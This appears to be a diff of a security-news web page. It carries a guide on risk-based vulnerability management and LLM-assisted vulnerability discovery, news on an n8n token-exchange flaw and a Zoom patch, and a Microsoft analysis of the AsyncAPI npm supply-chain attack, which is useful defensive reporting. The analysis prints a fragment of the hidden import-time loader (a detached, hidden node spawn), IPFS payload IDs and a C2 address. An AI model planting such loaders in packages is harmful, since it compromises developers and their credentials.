+Final Score = (W_1 * S_vuln) + (W_2 * S_asset) + (W_3 * S_threat)
+The variables and weights (W) are customized to the organization's risk appetite (for example, 0.20 for vulnerability, 0.40 for asset, and 0.40 for threat, summing to 1.0), while the underlying variables (S) are scored on a 0 to 100 scale and defined as follows:
+-
+Vulnerability severity (S_vuln): The inherent technical severity of the flaw. This is calculated by taking the CVSS Base Score (which natively accounts for confidentiality, integrity, and availability impact) and multiplying it by 10.
+-
+Asset context (S_asset): A combined metric of exposure and data sensitivity. Scores range from 100 for internet-facing assets holding customer data, down to 25 for internal-only assets with no sensitive data. To translate this impact into monetary terms for non-technical stakeholders, organizations can incorporate Factor Analysis of Information Risk (FAIR) principles into this metric. However, this approach requires highly accurate, continuously updated financial data that many enterprises struggle to maintain at scale.
+-
+Threat context (S_threat): The real-world urgency of the vulnerability. Scores range from 100 if actively exploited by threat actors relevant to the organization's profile, 75 if a proof-of-concept exists or if it is a vulnerability class easily exploited by autonomous AI agents, down to 25 if the exploit is theoretical and highly complex. Organizations should also map the Exploit Prediction Scoring System (EPSS) probability percentage directly into this variable. This allows the threat score to automatically scale up or down as real-world exploitation telemetry shifts, aligning static vulnerability data with active threat intelligence.
+An asset's customized risk score should directly influence internal remediation service-level agreements (SLAs), unless external compliance-driven mandates, such as CISA Binding Operational Directives (BODs), or relevant equivalents, override internal prioritization. A risk-driven and threat-intelligence-driven vulnerability prioritization methodology will help organizations focus resources on managing and mitigating the most critical security vulnerabilities first. This is an area where LLMs can support the vulnerability management process, particularly by helping teams synthesize unstructured threat intelligence to surface relevant risk contexts more efficiently. Enforcing strict SLOs for patching, while requiring formal risk acceptance documentation for any patching exceptions, will help reduce the number of vulnerabilities available to threat actors and increase the visibility of outstanding risks across the organization. Furthermore, organizations should integrate RBVM data directly into their security orchestration, automation, and response (SOAR) platforms for automated alert enrichment.
+Figure 2: Integration points of a risk-based vulnerability management (RBVM) program.
+Containment and Observability
+Modern architecture blueprints must prioritize attack surface reduction under the assumption that vulnerabilities will inevitably be exploited. Moving away from traditional perimeter defenses, organizations should align with zero trust principles, ensuring that security boundaries are established around every asset, workload, and identity.
+A component of this alignment is the implementation of strong authentication principles. Organizations should eliminate implicit trust by enforcing continuous, context-aware authentication and authorization. Utilizing Zero Trust Network Access (ZTNA) solutions, such as Identity-Aware Proxies (IAP), shields critical management interfaces (e.g., SSH, RDP) and internal systems from direct internet exposure, granting access only to verified identities and compliant devices.
+For public-facing applications and APIs, attack surface reduction involves deploying Layer 7 inspection at the load balancer or API gateway level. This hardening layer enforces strict schema validation, intercepting and neutralizing malformed inbound traffic and potential exploits before they can interact with internal application logic.
+Securing the software supply chain is equally vital in modern blueprints, and organizations should align with frameworks like [Supply-chain Levels for Software Artifacts (SLSA)](https://slsa.dev/spec/v0.1/levels) across both dependency and build tracks. Security policies should mandate that third-party dependencies are routed through a centralized artifact repository equipped with automated curation services, such as [Google Assured Open Source Software (OSS)](https://cloud.google.com/security/products/assured-open-source-software) or an equivalent solution, preventing untrusted code from entering the development lifecycle. Furthermore, maturing toward advanced SLSA build levels (e.g., SLSA level 3) through the implementation of isolation, ephemerality and reproducibility requirements via ephemeral compute infrastructure for CI/CD runners reduces the likelihood of attacker persistence by ensuring environments are short-lived and automatically cycled.
+To complement these pre-build controls, runtime observability should be established across all production workloads. This requires monitoring both infrastructure-level behavior and the specific runtime libraries actively executing in production, which surfaces true exploitable risk far beyond a static Software Bill of Materials. In tandem with monitoring workloads, organizations should secure how they authenticate by implementing workload identity federation. By removing static credentials and instead using short-lived tokens backed by strong cryptographic identity verification, organizations can reduce the risk of credential theft and unauthorized lateral movement.
+Within the internal environment, microsegmentation should be enforced to break down flat networks into granular security zones. Routing application traffic through a Secure Access Service Edge (SASE) architecture integrates network routing directly with robust identity controls, rendering internal services completely invisible to unauthenticated users and containing threats to their initial point of entry.
+Finally, automated containment and incident response within a zero trust framework must rely on deterministic, auditable tooling. Endpoint detection and response (EDR) platforms and SOAR playbooks should handle high-fidelity containment tasks through hardcoded execution logic. While AI tools accelerate triage and policy recommendation, actual execution capabilities must remain restricted to well-defined, pre-tested workflows to maintain total architectural predictability.
+Figure 3: Structural containment and observability architecture
+Track 2: Product Security & Development (1P Code)
+Deterministic and probabilistic tooling
+Integrating LLM agents into vulnerability management and security workflows requires recognizing the differences between deterministic and probabilistic tooling. Traditional SAST and DAST tools utilize fixed methodologies to evaluate vulnerabilities through structural code parsing or definitive runtime observations. LLMs, however, evaluate source code by processing tokens simultaneously to calculate statistical and semantic relationships, rather than tracing deterministic execution tracks.
+While techniques like Chain of Thought (CoT) prompting allow models to bridge this gap by decomposing complex code paths into intermediate reasoning steps, this process remains bounded by architectural limitations. Even when a model possesses a context window large enough to ingest entire repositories, it may experience attention degradation across long inputs, often failing to correctly weight intervening validation or sanitization logic within the prompt. For example, if a variable is tainted on line 10 but sanitized on line 500, attention degradation can cause the model to lose track of the sanitization logic. Furthermore, when enterprise codebases require chunking to fit within context limits, the resulting fragmentation may cause the model to lose track of end-to-end data flows.
+Consequently, probabilistic engines are effective at uncovering localized, static anomalies, such as hardcoded credentials or outdated dependencies, but frequently misjudge complex vulnerabilities split across fragmented chunks or extended context windows. Notable exceptions occur when these probabilistic models are coupled with deterministic feedback loops. For instance, when analyzing C++ memory corruption, an LLM can be equipped with a test harness to iteratively execute code and definitively prove a crash. While these dynamic validation applications are detailed in subsequent sections, the baseline limitation for static analysis across standard enterprise codebases remains: models struggle to consistently evaluate dispersed logic.
+Figure 4: Deterministic SAST scanners vs. probabilistic LLMs
+Binary and architectural oracles
+Many security programs are moving toward agent workflows where an agent autonomously spins up a test environment and uses tools to execute payloads and verify its findings. This is a promising approach, but it is important to understand where it is most effective.
+Agent workflows perform well against bug classes with binary and observable oracles, meaning the system provides an objective, 'crash or no crash' feedback loop. For example, if a model is hunting for memory corruption in a C++ kernel, a successful exploit is undeniable: the payload executes, and a resulting crash definitively proves the vulnerability. This explains why the industry is currently seeing a surge in AI-discovered vulnerabilities across memory-unsafe targets like web browsers and operating systems.
+However, enterprise software is heavily dominated by vulnerabilities that require architectural oracles for validation. Vulnerabilities like authorization bypasses, complex business logic flaws, and indirect server-side request forgeries require an understanding of business context and cross-service trust boundaries. If an agent's payload fails to produce a clear outcome, it can't reliably distinguish whether the vulnerability is a hallucination or if it simply constructed the payload incorrectly. An agent's malformed payload might even crash an unrelated background process and cause the model to hallucinate a success and report a false confirmation. Complex enterprise architecture contains unwritten business intent that a probabilistic engine can't inherently know.
+Figure 5: Evaluating vulnerabilities against binary vs. architectural oracles
+Targeted deployment and human impact
+Organizations adopting LLMs for vulnerability discovery face a massive staffing challenge. LLMs can generate findings significantly faster than human engineers can triage them. If every LLM-generated alert requires manual review, security teams will quickly face burnout and/or suffer alarm fatigue.
+Rather than indiscriminately pointing agents at all available codebases and risking an influx of unverified output, security teams need a selective deployment strategy. Mature programs should maintain SAST and DAST for baseline hygiene and deterministic rule enforcement, and reserve intensive agent audits for high-impact components with clear binary oracles.
+Organizations can prioritize agent audits on systems where the technology's strengths align with the broader risk profile:
+-
+Memory-unsafe codebases: Legacy or high-performance components written in memory-unsafe languages such as C, C++, or Assembly are strong candidates for LLM audits. These languages are susceptible to memory corruption flaws, such as buffer overflows and use-after-free conditions. Because these vulnerabilities trigger definitive failure states like segmentation faults, they work well with automated sandboxes where agents can compile the code with memory sanitizers and write proof-of-concept inputs. This approach is also effective for auditing the native extensions where safe languages call unsafe internal libraries, such as Python C extensions or the Java Native Interface (JNI).
+-
+Systems highly exposed to outside content: First-party data ingestion pipelines, custom API gateways, or proprietary edge proxies. A prerequisite here is direct access to the source code, this strategy is strictly for internally developed or fully open-source codebases where the organization can inspect the logic. Because these systems directly parse untrusted internet traffic, targeting their source code for LLM-driven audits yields the highest risk-reduction ROI.
+-
+Shared internal libraries and utilities: Core serialization/deserialization packages, common utility functions, and custom middleware wrappers (such as internal message-queue parsers) maintained in-house. Because the enterprise owns the source code for these shared building blocks, agent tools can easily hook into them within automated test harnesses to fuzz inputs and catch low-level logic or parsing bugs with high fidelity.
+-
+Foundational security boundaries: Internally developed centralized authentication services, custom OAuth providers, and internal credential brokers. While testing complex identity boundaries generates higher logic-based noise, having full access to the source code allows teams to pair agents with deterministic checks to safely triage findings, given that the blast radius of an authentication failure justifies the human effort.
+To filter the noise generated by LLMs, organizations should establish routing rules. Require the agent to generate a fully reproducible, deterministic test harness (such as a compiled binary or a Python test script) that attempts to prove the exploit. This harness must execute automatically in an isolated, monitored sandbox. If the sandbox execution fails (due to a syntax error or a failed exploit), the ticket is discarded, sparing human resources. However, organizations should enforce execution timeouts and iteration limits on these test harnesses. Without hard limits, an autonomous agent attempting to prove a vulnerability can fall into an infinite loop: writing a script, failing, rewriting, and failing again, exhausting API token budgets and compute resources against a single dead-end vulnerability, creating significant cost overruns without advancing the security review. To manage these expenses, organizations should incorporate FinOps principles to balance the compute and API costs of LLM audits against the traditional expenses of manual triage.
+However, a successful execution in the sandbox does not guarantee an actionable, high-priority risk. In practice, autonomous agents frequently produce working PoCs for genuine technical flaws that are ultimately irrelevant; or warrant a lower remediation priority within the context of the system's threat model. For example, the agent might successfully exploit an unreachable dead-code path, or trigger a bug that requires administrative access to execute and yields no further escalation of privilege. Therefore, a human engineer should be assigned to review and prioritize the ticket only if the sandbox registers a successful execution, validating environmental context, reachability, and true business impact as part of the review.
+This workflow reduces the volume of alerts, but it is important to understand that the security team's workload does not disappear. The engineer's primary job shifts from manually hunting for the initial vulnerability to auditing the LLM-generated proof to ensure it represents a meaningful risk rather than an unexploitable or contextually irrelevant finding. Leadership should properly staff and train teams for this new reality. Deploying LLM agents does not remove the need for skilled practitioners; it redirects their workload toward complex validation. Equally important is training teams to recognize the risk of false negatives. A hyper-focus on filtering AI-generated noise can create a false sense of security. If an exploit relies on a novel technique or a zero-day vulnerability that was not heavily weighted in the model's training data, the agent will likely scan right past it in silence. LLMs augment discovery, but they do not guarantee exhaustive coverage.
+When integrating LLMs into SAST triage pipelines, human engineers should also verify the broader architectural integrity. Prompting an LLM with specific SAST warnings can induce contextual narrowing, where the agent becomes hyper-fixated on resolving a localized syntax error and misses broader architectural flaws existing in the same file. Furthermore, if the agent's mandate extends beyond discovery to automated remediation (such as writing and proposing code fixes), this human-in-the-loop validation becomes critical to ensure the LLM does not inadvertently introduce new regressions or bypass intended business logic.
+Figure 6: Flowchart outlining the targeted LLM deployment and triage workflow.
+Remediation and hardening
+LLM-assisted code remediation
+A primary goal of integrating large language models (LLMs) into the software development lifecycle is automated remediation. To achieve this, organizations are deploying these capabilities through two primary execution methods: directly within the integrated development environment (IDE) or as a centralized pipeline runner. Examples include [CodeMender](https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/), although as of time of writing, it is not publicly available.
+IDE-integrated method
+This method shifts remediation as far left as possible by operating as an active pair-programmer. Tools running continuous static analysis in the background of the IDE surface vulnerabilities directly to the developer via editor diagnostics like inline indicators or hover tooltips.
+-
+Localized scope: The developer can trigger the LLM agent to analyze the localized data flow and generate a targeted patch (such as implementing parameterized SQL queries). By constraining the LLM to localized, syntax-level fixes, the scope of the change remains contained. This prevents the agent from attempting sprawling, multi-file refactors that frequently break complex architectural logic.
+-
+Human-in-the-loop: The developer reviews the AI-generated patch before the code is committed.
+-
+Managing false positives: Local IDE agents allow developers to manage false positives dynamically. Suppressing alerts anchored to specific line text reduces alert fatigue and preserves developer trust.
+CI/CD runner method
+The runner method executes asynchronously within the CI/CD pipeline to use an LLM to review committed code and automatically propose remediation.
+-
+Restricted execution and deterministic validation: Asking a centralized runner to automatically rewrite a complex, multi-file authorization flaw directly in the main branch introduces a high risk of breaking logic errors. To mitigate this, agents must be restricted to generating pull requests (PRs). Once a PR is generated, it must automatically execute standard regression suites alongside the deterministic test harness. By rerunning the initial PoC against the patched code, the workflow repurposes the exploit script as a validation oracle to prove the vulnerability has been remediated. A human engineer then reviews the PR to validate the architectural logic before merging.
+In all cases security teams should define a clear boundary between the two methods rather than rely on a single approach. IDE agents provide immediate, syntax-level support. They catch and resolve low-complexity errors locally before developers commit code. Centralized CI/CD runners handle broader organizational baselines. They propose complex, repository-wide fixes for vulnerabilities that bypass local environments.
+Post-deployment controls
+Even with human review and deterministic test harnesses, AI-generated patches can still introduce logic regressions in production. Organizations should implement strict post-deployment controls:
+-
+Automated rollbacks: Treating LLM-generated code with the same post-deployment scrutiny as any major architectural change ensures that if an unforeseen regression traverses the CI/CD pipeline, the environment can revert to a known good state.
+-
+Mitigating model drift: Relying on managed AI services introduces the ongoing risk of model drift. To prevent silent weight updates from breaking test harnesses, organizations need to pin specific model API versions to frozen releases. When a pinned version reaches its end-of-life, organizations will face a forced migration. Mitigating this pipeline fragility requires combining model pinning with deterministic regression suites.
+-
+Compliance and auditability: If an AI agent automatically closes a security ticket or generates a patch in the CI/CD pipeline, organizations should maintain immutable audit logs to satisfy frameworks like SOC 2 ,PCI-DSS, FedRAMP, and CMMC. National security deployments must also account for data sovereignty requirements. This logging should record the specific model version that proposed the fix, the deterministic test results that validated it, and the human engineer who approved the merge. Furthermore, because emerging legislation like the EU AI Act emphasizes human oversight for high-risk applications, security teams should carefully evaluate how autonomous remediation workflows align with these evolving global regulatory standards.
+Figure 7: Flowchart demonstrating the difference between local IDE AI remediation and centralized CI/CD pipeline remediation.
+Conclusion
+Leveraging LLMs in vulnerability management is a multi-layer solution: Integrating it requires separating workflows by layer. At the enterprise infrastructure level, Risk-Based Vulnerability Management (RBVM) and exposure management are necessary to process the volume of findings and configuration drift. At the product and code security level, LLM-enabled vulnerability assessment and remediation must operate alongside foundational deterministic controls, such as SAST and DAST, to audit custom, open-source, or third-party code.
+Although LLMs can help manage technical debt and accelerate vulnerability discovery, they do not replace secure-by-design principles. The fact that LLM agents are proving exceptionally capable at identifying and exploiting localized memory corruption in memory-unsafe codebases, alongside other primary vectors, should serve as a wake-up call.
+As a long-term strategy aligned with [NSA guidance on Software Memory Safety](https://media.defense.gov/2022/Nov/10/2003112742/-1/-1/0/CSI_SOFTWARE_MEMORY_SAFETY.PDF), organizations need to phase memory-safe languages into new internal development. LLMs are beginning to expand what is possible here by reducing the manual labor required for code migration. Converting existing C or C++ codebases to Rust has historically been unrealistic due to the large volume of engineering hours needed. While fully automated translation is not a turn-key solution, using LLMs to assist engineers with the bulk of the conversion can make these long-term migrations operationally viable. Beyond internal efforts, organizations should use procurement requirements to incentivize vendors to reduce their reliance on memory-unsafe languages and establish secure configuration defaults over time. Bridging the gap between AI velocity and enterprise defense means building an automated pipeline to manage the current backlog, while architecting systems where entire classes of vulnerabilities and misconfigurations are eliminated by design.
+Acknowledgements
+This analysis would not have been possible without the assistance of Google Threat Intelligence Group (GTIG) and other broader Google teams.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">n8n Token Exchange Flaw Could Let Attackers Log In as Users From Another Issuer</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/n8n-token-exchange-flaw-could-let.html" target="_blank">Original Link</a></p>
+            <div class="content-text">[n8n](https://thehackernews.com/2026/03/critical-n8n-flaws-allow-remote-code.html), the workflow automation platform, handed out the wrong accounts at login. On Enterprise instances configured to trust more than one external token issuer, it matched an incoming JWT to a local user on the sub
+claim alone and ignored iss
+.
+A valid token from issuer A carrying a sub
+that belongs to someone under issuer B logged you in as them. Their password never came into it. n8n shipped the fix on June 24.
+The flaw is tracked as [ CVE-2026-59208](https://nvd.nist.gov/vuln/detail/CVE-2026-59208). The CVE record did not go public until July 9. n8n
+[credits the report](https://github.com/n8n-io/n8n/security/advisories/GHSA-mq3m-f8x3-579w)to the GitHub account
+[bearsyankees](https://github.com/bearsyankees), whose profile lists Strix, which makes an AI penetration testing agent.
+Strix [says](https://www.strix.ai/blog/n8n-cross-issuer-account-takeover) it pointed out that the agent at the token-exchange flow and found the identity-binding bug there.
+Two issuers, one account
+Token exchange is n8n's Enterprise route for [OEM partners who embed the product](https://docs.n8n.io/deploy/host-n8n/deploy-as-an-oem-integration), an [RFC 8693 implementation](https://docs.n8n.io/release-notes) that spares their users a second login screen.
+The partner signs a short-lived JWT with its own key, n8n verifies it against a configured public key, matches the claims to a local account, and the user is in. Trusted keys go in N8N_TOKEN_EXCHANGE_TRUSTED_KEYS
+, and the [deployment docs](https://docs.n8n.io/deploy/host-n8n/configure-n8n/basic-configuration/use-environment-variables/deployment) still tag the feature as preview.
+The token itself checks out. The matching is the bug. A sub
+value is only guaranteed to be unique inside the issuer that minted it. [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html) asks that it be "scoped to be locally unique in the context of the issuer" or else globally unique. The identifier for a user is therefore [the pair, iss plus sub](https://thehackernews.com/2025/06/noauth-vulnerability-still-affects-9-of.html).
+n8n keyed on half of it. Nothing stops two issuers from emitting the same subject string, and when they do, both land on one n8n account.
+How big a deal is this
+The flaw reaches an instance only if token exchange is switched on and the config trusts at least two external issuers. [n8n says](https://github.com/n8n-io/n8n/security/advisories/GHSA-mq3m-f8x3-579w) nothing else is affected. Token exchange is Enterprise-only and still flagged as a preview, so the exposed set is small and specific: OEM deployments, where trusting a second issuer is a supported configuration.
+What the advisory does not pin down is how an attacker gets the token. It says only that they can obtain one. The practical question is whether an ordinary user at a trusted issuer can influence the sub
+they receive. The public record does not answer it. GitHub's CVSS 4.0 vector marks attack requirements as present and stops there.
+GitHub assigned that vector. As the CNA here, it puts CVE-2026-59208
+at 7.6 on CVSS 4.0, high. NVD puts the same bug at 6.8 on CVSS 3.1, medium, and has not issued a 4.0 assessment at all; its record carries CWE-287
+and CWE-346
+. CISA's July 13 SSVC assessment records exploitation as none, and The Hacker News found no public proof-of-concept in searches on July 16.
+Two weeks before the June 24 fix, the maintainers patched [ CVE-2026-54305](https://github.com/n8n-io/n8n/security/advisories/GHSA-2j5h-858j-5mpf), another Enterprise-only flaw. It lets any authenticated user overwrite or revoke another user's stored OAuth tokens through the Dynamic Credentials endpoints. That one was a missing ownership check, not an identity binding. Different bug, same surface.
+The Hacker News has reached out to n8n for confirmation on the scope and impact of CVE-2026-59208
+and will update this story with any response.
+Patch or cut the issuer list
+CVE-2026-59208
+affects every n8n release below 2.27.4 and version 2.28.0. The fix first landed in 2.27.4 and 2.28.1. Those are the floor. On July 16, n8n's npm package carried 2.30.6 on both its latest
+and stable
+tags. It ships a new minor most weeks by its own account, so check the tag and take the newest stable build your deployment supports.
+If patching has to wait, work out what you are running: N8N_TOKEN_EXCHANGE_TRUSTED_KEYS
+holds the trusted signing keys, and a separate preview flag controls whether token exchange is on at all. Cut back to a single trusted issuer, or turn the feature off.
+The advisory calls both short-term measures and says neither fully remediates the risk. That is boilerplate, identical in at least three other n8n advisories, including the June 10 one. By n8n's own scope statement, an instance with token exchange off is not affected.
+Neither release note mentions the fix. The Hacker News checked both: between them, the [2.27.4](https://github.com/n8n-io/n8n/releases/tag/n8n%402.27.4) and [2.28.1](https://github.com/n8n-io/n8n/releases/tag/n8n%402.28.1) changelogs cover a Python import fix, a Google Ads node upgrade, an AI workflow check, and a node-building change, and nothing about identity.
+The advisory is where this one lives. If your upgrade decisions run on changelogs, this is the kind of fix that slips past.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Zoom Patches Critical Windows Flaw That Could Enable Account Takeover</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/zoom-patches-critical-windows-flaw-that.html" target="_blank">Original Link</a></p>
             <div class="content-text">Zoom has released security updates for a critical security flaw impacting Zoom Workplace for Windows that could facilitate account takeover.
-The vulnerability, tracked as CVE-2026-53412 (CVSS score: 9.8), affects Zoom Desktop Client for Windows, Zoom VDI Client for Windows, and Zoom Meeting SDK for Windows.
-"Improper Input Validation in Zoom Desktop Client for Windows, Zoom VDI Client for Windows, and Zoom Meeting SDK for Windows may allow an unauthenticated user to conduct an account takeover via network access," Zoom [said](https://www.zoom.com/en/trust/security-bulletin/zsb-26014/) in an advisory released this week.
+The vulnerability, tracked as CVE-2026-53412 (CVSS score: 9.8), affects Zoom Workplace for Windows before version 7.0.0 and Zoom Workplace VDI Client for Windows before version 7.0.10, 6.6.15, and 6.5.18 in their respective branches.
+"Improper Input Validation in Zoom Desktop Client for Windows and Zoom VDI Client for Windows may allow an unauthenticated user to conduct an account takeover via network access," Zoom [said](https://www.zoom.com/en/trust/security-bulletin/zsb-26014/) in an advisory released this week.
 The latest security fixes also address three high-severity flaws -
 [CVE-2026-53411](https://www.zoom.com/en/trust/security-bulletin/zsb-26013/)(CVSS score: 7.8) - An improper input validation vulnerability in the Zoom Workplace VDI Plugin for Windows before version 6.6.14 that may allow an authenticated user to conduct an escalation of privilege via local access.[CVE-2026-53410](https://www.zoom.com/en/trust/security-bulletin/zsb-26012/)(CVSS score: 7.0) - A time-of-check to time-of-use (TOCTOU) race condition vulnerability in the installation and uninstallation process of certain Zoom Clients for Windows that could allow an authenticated local user to escalate privileges.[CVE-2026-53409](https://www.zoom.com/en/trust/security-bulletin/zsb-26011/)(CVSS score: 7.8) - An improper privilege management vulnerability in Zoom Rooms for Windows before version 7.1.0 that may allow an authenticated user to conduct an escalation of privilege via local access.
 It's worth noting that CVE-2026-53410 affects the following products -
@@ -79,158 +396,98 @@ It's worth noting that CVE-2026-53410 affects the following products -
 - Zoom Rooms for Windows before 7.0.5
 - Remote Control for Zoom Contact Center for Windows before version 7.0.0
 As of writing, there are no indications that any of the flaws are being exploited in real-world attacks. Users can stay protected by applying the latest updates.
+(The story was updated after publication to reflect Zoom's removal of Meeting SDK for Windows as an affected product.)
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">Unpacking the AsyncAPI npm supply chain compromise and import-time payload delivery</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/07/15/unpacking-asyncapi-npm-supply-chain-compromise-import-time-payload-delivery/" target="_blank">Original Link</a></p>
-            <div class="content-text">On July 14, 2026, Microsoft Threat Intelligence identified a coordinated supply chain compromise of the @asyncapi npm organization, a widely used set of packages for the AsyncAPI specification and code generation. Five package versions across four package names were republished within roughly ninety minutes, each carrying the same maliciously injected loader: @asyncapi/specs (in both the 6.11.2-alpha.1 prerelease and 6.11.2 stable release), @asyncapi/generator@3.3.1, @asyncapi/generator-components@0.7.1, and @asyncapi/generator-helpers@1.1.1.
-Because @asyncapi/specs is a transitive dependency of numerous AsyncAPI tooling packages, this attack affected developer workstations, CI/CD pipelines, container builds, or production services that resolved and imported the affected versions during the exposure window. Unlike the more common postinstall-hook supply-chain pattern, this campaign executes at module-load (import/require) time. When any consuming build or application imports a poisoned package, the injected block runs immediately. Because the trigger is an import rather than an install script, the common npm install –ignore-scripts mitigation does not neutralize it. The second stage decrypts and evaluates a Miasma modular runtime with active command and control (C2), persistence, and decentralized fallback channels. Although disabled in this instance, credential-harvesting, propagation, and additional high-risk modules could be enabled through persistence.
-Microsoft Defender Antivirus detects and blocks malicious artifacts as Trojan:JS/MiasmStealer.SC and Trojan:Script/Supychain.A. Microsoft Defender for Endpoint provides behavioral coverage for the suspicious detached Node.js process spawn, IPFS retrieval, and persistence activity. Organizations should immediately remove all five affected versions, purge npm and Yarn caches, hunt for sync.js under the NodeJS masquerade directories, block outbound connections to 85.137.53[.]71 on ports 8080, 8081, and 8091, and rotate all credentials accessible from any environment that imported the compromised packages. Detailed hunting queries, indicators of compromise, and mitigation guidance are provided in the succeeding sections.
-Attack chain overview
-The compromise originated from a pwn request against asyncapi/generator. A misconfigured GitHub Actions workflow (pull_request_target) executed attacker-controlled pull-request (PR) code, exposed the asyncapi-bot personal access token (PAT), and enabled unauthorized pushes to auto-publish branches. The legitimate GitHub Actions OpenID Connect (OIDC) release workflows then published the poisoned packages under the automated identity npm-oidc-no-reply@github[.]com, producing artifacts with valid provenance signatures built from unauthorized source commits.
-The campaign progressed through six phases, shown in Figure 1:
-- Pipeline compromise. The attacker exploited a vulnerable GitHub Actions workflow to steal a privileged bot token.
-- Code injection. Heavily obfuscated loaders were inserted into one source file per package.
-- Staged release. An alpha prerelease was followed by a stable release 24 minutes later, with a byte-identical payload, expanding blast radius.
-- Delivery. Consumers pulled poisoned versions through normal npm and Yarn dependency resolution; –ignore-scripts was not effective.
-- Import-time execution. require() or import triggered the malicious main(), which spawned a hidden detached child process.
-- IPFS second-stage fetch. The child downloaded sync.js from IPFS and wrote it to an OS-specific “NodeJS” masquerade directory.
-The Miasma runtime provided encrypted bootstrap, persistence, C2 communication, data return paths, and resilient discovery via Nostr, Ethereum, BitTorrent DHT, libp2p, and IPFS. Six additional capability modules (credential harvest, encrypted exfiltration, supply-chain propagation, metamorphic generation, AI-tool poisoning, and sandbox evasion) were implemented but disabled in this build.
-| Time (UTC) | Observed event |
-| ~07:10 | @asyncapi/generator@3.3.1, @asyncapi/generator-components@0.7.1, and @asyncapi/generator-helpers@1.1.1 republished with the injected loader. |
-| 08:06:20 | @asyncapi/specs@6.11.2-alpha.1 published with the malicious importer prepended to index.js. |
-| 08:30:09 | @asyncapi/specs@6.11.2 stable published with a byte-identical payload, widening downstream reach. |
-| 08:49:22 | First observed downstream fetch of the stable 6.11.2 tarball into a Yarn cache during dependency installation. |
-How the attack started: GitHub Actions pwn request
-The attack chain began with a malicious pull request targeting the asyncapi/generator repository’s docs-preview automation. Opened as PR #2155, it carried the attacker-controlled commit 47be388, timestamped 05:08:58 UTC on July 14. The associated Docs Preview (Netlify) workflow started at 05:11:05 UTC.. Although the PR and source fork were later removed, the workflow record remains available.
-The pull request PR #2155 targeted manual-netlify-preview.yml, which combined two unsafe choices: it used pull_request_target, placing the job in the base repository’s security context, and it checked out the pull request’s untrusted head commit. The run had a broadly privileged GITHUB_TOKEN, checkout credentials persisted in the local Git configuration until post-job cleanup (the default behavior of actions/checkout), and steps that referenced repository secrets.
-The submitted MDX contained code was designed to retrieve JavaScript from rentry[.]co/elzotebo999 and evaluate the response. The public log confirms that the malicious commit was processed by the privileged workflow, but it does not show whether the rentry[.]co web request succeeded or whether a credential was stolen. Later push records identify asyncapi-bot as the authenticated actor. Together, these records establish that the vulnerable workflow ran before the bot-authenticated pushes, but they do not establish how the credential was obtained.
-The underlying workflow weakness had been identified before the compromise. On April 29, a proof-of-concept examined whether untrusted pull-request content could be executed in the privileged docs-preview workflow. A May 17 proposal then sought to separate untrusted build activity from steps that received repository secrets and was still under review when the incident occurred.
-Trusted publishing became the delivery mechanism
-Once the attacker could push commits as asyncapi-bot, there was no need to compromise npm or construct a separate publishing channel. The attacker could ride the project’s normal release path and let its trusted pipeline do the distribution. Commit 3eab3ec carries a timestamp of 06:58:42 UTC, while a surviving push-triggered workflow started at 07:05:42 UTC. Its message, “fix: test release workflow on next”, matched the release workflow’s commit-message condition. The legitimate release-with-changesets.yml workflow then published three poisoned packages at approximately 07:10 UTC.
-A closely linked compromise subsequently affected asyncapi/spec-json-schemas. The malicious lineage first triggered workflows on alpha between 07:56 and 08:04 UTC. The same malicious commit was later pushed to master at approximately 08:14 UTC, followed by a child commit at 08:28 UTC. The legitimate if-nodejs-release.yml workflow published @asyncapi/specs@6.11.2-alpha.1 at 08:06 UTC and @asyncapi/specs@6.11.2 at 08:30 UTC.
-All five malicious versions were published through npm trusted publishing using GitHub OIDC and carried valid provenance attestations. The attestations accurately identified the legitimate repositories, commits, and workflows that created the packages, even though the triggering commits were unauthorized.
-The payload operates in multiple stages, each designed to increase evasion and ensure resilient execution. Stage 0 establishes stealth by declaring no npm lifecycle hooks. Stage 1 executes the loader at require-time and spawns a hidden child process. Stage 1b deobfuscates the IPFS fetch logic and downloads sync.js. Stage 2 decrypts the ~8.2 MB encrypted bundle through three cryptographic layers. Stage 3 initializes the full Miasma modular runtime with C2, persistence, and decentralized fallback channels.
-Stage 0: No lifecycle hooks declared
-The absence of lifecycle hooks is a deliberate evasion choice. Security tooling that focuses on preinstall/postinstall auditing will not flag these packages. All affected packages declared no preinstall, install, or postinstall hooks in package.json. This bypassed hook-focused scanners and left import-time execution as the real trigger path.
-Stage 1: Import-time loader
-The loader executes the moment any application imports the compromised module; no user action beyond dependency resolution is required. The attacker placed the same bootstrap pattern in each package’s exported entry path, so normal application startup would trigger execution automatically.
-- @asyncapi/specs → index.js
-- @asyncapi/generator → lib/templates/config/validator.js
-- @asyncapi/generator-helpers → src/utils.js
-- @asyncapi/generator-components → lib/utils/ErrorHandling.js
-spawn('node', [payloadPath], { detached: true, stdio: 'ignore', windowsHide: true, }).unref(); |
-Stage 1b: IPFS fetch
-The inner payload reveals hard-coded IPFS content identifiers and OS-aware drop logic. This intermediate stage reconstructs the transport routine at runtime, so the larger second stage never appears in cleartext in the published package.
-| Package set | IPFS CID |
-| specs | Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf |
-| generator-family | QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9 |
